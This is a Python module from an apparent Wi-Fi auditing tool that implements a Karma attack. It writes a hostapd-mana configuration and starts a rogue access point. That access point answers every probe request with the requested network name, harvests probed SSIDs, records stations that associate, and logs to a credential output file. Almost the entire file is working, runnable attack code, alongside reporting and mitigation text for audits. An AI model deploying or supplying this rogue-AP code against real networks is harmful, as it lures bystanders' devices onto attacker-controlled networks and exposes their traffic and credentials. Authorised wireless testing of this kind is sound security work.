"""Karma: answer every probe request, with the name the client just asked for.

An evil twin has to know which SSID to imitate.  Karma removes the question: it
answers *every* probe request — wildcard or directed — with a beacon and an
association for the name in the request, so a station that is looking for
``HomeNetwork`` finds an AP calling itself ``HomeNetwork``, one it may already trust.
The technique dates from the days when clients connected to any network with a matching
name and no security; modern clients prefer networks they have *configured*, and many
refuse open networks, which is why a modern Karma implementation (hostapd-mana) also
runs a known-beacon list and a PSK for networks the client expects to be encrypted.

wifipilot ships the attack because the measurement is worth having: which stations in
range are still willing to talk to a network that exists only because they asked for
it, and which SSIDs they ask for at all.  The report answers both, and says plainly
which clients refused — a client that ignores an unknown open network is *not* a
finding, and this module never counts it as one.

The twin hostapd is started with ``enable_mana=1`` when hostapd-mana is installed, and
the attack refuses to run otherwise: plain hostapd cannot answer probes it does not
expect.  Everything is stopped in a ``finally`` block.
"""

from __future__ import annotations

import contextlib
import os
import re
import time
from typing import Dict, List, Tuple

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..rawtx import injection_available
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome

#: hostapd-mana's output, the three things worth reading in it
CONNECT_RE = re.compile(r"AP-STA-CONNECTED", re.I)
#: "MANA: probe request ... SSID=..." — the name a station is asking for
PROBE_SSID_RE = re.compile(r"SSID[=: ]\s*\"?(?P<ssid>[^\"\n]{1,32})", re.I)
MAC_RE = re.compile(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", re.I)


def patterns() -> Tuple[re.Pattern, re.Pattern, re.Pattern]:
    """The three compiled patterns, in one place (used by the live path and tests)."""
    return CONNECT_RE, PROBE_SSID_RE, MAC_RE


class KarmaAttack(Attack):
    """Answer every probe request with the name the client asked for."""

    name = "karma"
    label = "Karma (answer every probe request)"
    tool = "hostapd-mana (enable_mana=1)"
    description = ("Answer every probe request with the SSID the client just asked for, "
                   "and see which stations associate with a network that exists only "
                   "because they asked.  Modern clients often refuse — that refusal is "
                   "the finding, and it is reported as one.")
    requires = ("monitor",)
    needs_injection = True          # it is an access point
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE")

    def applies(self, ap: AccessPoint) -> bool:
        # Karma does not need a named SSID (that is the point) but it does need
        # stations to be probing near this radio
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(registry.path("hostapd-mana"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return ("needs hostapd-mana: plain hostapd cannot answer probes it does not "
                "expect, which is the whole technique")

    # ---------------------------------------------------------------- #
    def _config(self, ap: AccessPoint, directory: str, iface: str) -> str:
        """A Karma hostapd config: mana on, beacons for whatever is asked for."""
        path = os.path.join(directory, "karma.conf")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(
                "# wifipilot Karma: answers probes, stopped automatically\n"
                f"interface={iface}\n"
                "driver=nl80211\n"
                "ssid=wifipilot-karma\n"
                f"channel={ap.channel or 6}\n"
                "hw_mode=g\n"
                "auth_algs=1\n"
                "wpa=2\n"
                "wpa_key_mgmt=WPA-PSK\n"
                "rsn_pairwise=CCMP\n"
                "wpa_passphrase=karmakarmakarma\n"
                "enable_mana=1\n"
                "mana_loud=1\n"
                "mana_credout=karma.creds\n"
                "mana_macacl=0\n"
                "ignore_broadcast_ssid=0\n")
        return path

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ctx.config.stealth:
            ctx.session.end_attempt(attempt, "skipped", "stealth mode",
                                    "Karma transmits beacons and associations")
            return AttackOutcome.skipped("stealth mode is on",
                                         "Karma is an access point: it transmits")
        ctx.bus.log(f"Karma on channel {ap.channel}: answering every probe request in "
                    f"range — clients that already trust an unknown SSID shape will "
                    f"answer, modern ones usually will not", level="warning")
        if ctx.demo:
            return self._demo(ctx, ap, attempt)
        return self._live(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                asked: Dict[str, int], joined: List[str], refused: List[str],
                seconds: float, simulated: bool) -> AttackOutcome:
        if not asked:
            return self._fail(
                ctx, attempt, "no probe requests were seen",
                f"{human_duration(seconds)} of beaconing with mana enabled and nothing "
                f"asked for a network: no clients in range, or the interface is not on "
                f"a channel they use")
        detail = (f"{len(asked)} distinct SSID(s) probed, {sum(asked.values())} probe(s) "
                  f"answered; {len(joined)} station(s) associated, "
                  f"{len(refused) or 'no'} known station(s) refused the unknown network"
                  + (" (simulated)" if simulated else ""))
        if joined:
            severity = "high"
            title = "Stations associate with a Karma network (any SSID they ask for)"
            body = (f"{len(joined)} station(s) ({', '.join(joined[:3])}) joined a network "
                    f"that exists only because they probed for it.  These clients do "
                    f"not verify the identity of the network beyond its name, so a "
                    f"targeted twin is not even necessary — the name is enough.  "
                    f"Mitigation is client-side: WPA3-only configuration, and not "
                    f"probing for networks that are not in range.")
        else:
            severity = "medium"
            title = "Karma answered probes; no station associated"
            body = (f"{len(asked)} distinct SSID(s) were probed and answered.  No "
                    f"station associated: these clients ignore networks they are not "
                    f"configured for, which is the correct behaviour and is reported as "
                    f"such.  The harvested SSID list is still intelligence — it is the "
                    f"set of names a targeted twin would need.")
        if simulated:
            body += "  (Simulated.)"
        body += f"  Probed names: {', '.join(list(asked)[:6])}"
        ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                        bssid=ap.bssid, title=title, detail=body))
        ap.remember("karma", detail, ssids=list(asked)[:20], joined=joined[:10])
        ctx.session.stats.karma_runs += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(
            title, detail=detail,
            extra={"probed_ssids": asked, "joined": joined[:20],
                   "refused": refused[:20], "simulated": simulated,
                   "note": ("the deliverable is which stations trust a name they asked "
                            "for, plus the list of names worth imitating")})

    # ---------------------------------------------------------------- #
    def _probes_from_session(self, ctx: AttackContext) -> Dict[str, List[str]]:
        """Which stations probed for which names, from the scanner's own state."""
        asked: Dict[str, List[str]] = {}
        for client in ctx.session.clients.values():
            for ssid in (client.probes or []):
                if ssid and client.mac not in asked.setdefault(ssid, []):
                    asked[ssid].append(client.mac)
        return asked

    def _demo(self, ctx: AttackContext, ap: AccessPoint,
              attempt: Attempt) -> AttackOutcome:
        asked = self._probes_from_session(ctx)
        counts = {ssid: len(macs) for ssid, macs in asked.items()}
        if not counts:                                  # nothing probed yet: invent none
            return self._fail(ctx, attempt, "no probe requests were seen",
                              "the simulated neighbourhood has no probing clients on "
                              "this channel")
        radio = ctx.radio
        demo_ap = radio.find(ap.bssid) if radio else None
        # a modern (WPA3-only) client base refuses the unknown network; older clients do
        # not, which is exactly the difference the attack exists to measure
        modern = bool(demo_ap is not None and demo_ap.encryption == "WPA3")
        joined: List[str] = []
        refused: List[str] = []
        stations = [mac for macs in asked.values() for mac in macs][:6]
        for index, station in enumerate(stations):
            ctx.progress(f"Karma on {ap.display_name}", kind="capture", bssid=ap.bssid,
                         percent=min(95, (index + 1) / max(1, len(stations)) * 100),
                         detail=f"{len(joined)} joined, {len(refused)} refused")
            time.sleep(0.3)
            if ctx.want_stop():
                break
            (refused if modern else joined).append(station)
        return self._finish(ctx, ap, attempt,
                            {ssid: len(macs) for ssid, macs in asked.items()},
                            joined, refused, 2.0, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint,
              attempt: Attempt) -> AttackOutcome:
        binary = registry.path("hostapd-mana")
        if not binary:
            return self._fail(ctx, attempt, "hostapd-mana missing",
                              "install hostapd-mana (plain hostapd cannot answer "
                              "probes it does not expect)")
        iface = ctx.config.twin_interface or ctx.monitor
        if not injection_available(iface):
            return self._fail(ctx, attempt, "raw injection unavailable",
                              f"cannot transmit on {iface}: need root and a monitor "
                              f"interface")
        directory = os.path.dirname(ctx.artifact_path("karma", ap, "")) or "."
        config = self._config(ap, directory, iface)
        timeout = min(ctx.config.attack_timeout_for(self.name), 300.0)
        proc = Process([binary, config], name="hostapd-mana",
                       echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start hostapd-mana", proc.error)
        asked: Dict[str, int] = {}
        joined: List[str] = []
        probed: List[str] = []
        #: hostapd-mana's output is a growing list, so remember how far we have read:
        #: re-scanning it every second would count the same probe request again and
        #: again, and the summary is supposed to be a measurement
        read_lines = 0
        connect_re, probe_re, mac_re = patterns()
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(1.0)
                ctx.progress(f"Karma on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail=(f"{len(asked)} SSID(s) probed, {len(joined)} "
                                     f"joined"))
                lines = list(proc.lines)
                for line in lines[read_lines:]:
                    match = probe_re.search(line)
                    if match and match.group("ssid"):
                        ssid = match.group("ssid").strip()
                        asked[ssid] = asked.get(ssid, 0) + 1
                        for mac in mac_re.findall(line):
                            if mac.lower() not in probed:
                                probed.append(mac.lower())
                    if connect_re.search(line):
                        for mac in mac_re.findall(line):
                            if mac.lower() not in joined:
                                joined.append(mac.lower())
                read_lines = len(lines)
                if joined and len(joined) >= 3:
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            with contextlib.suppress(Exception):
                if proc.running:
                    proc.stop(grace=2.0)
        # the stations that asked for a name and did not take the answer are as much
        # a result as the ones that did
        refused = [mac for mac in probed if mac not in joined]
        return self._finish(ctx, ap, attempt, asked, joined, refused,
                            time.time() - started, False)
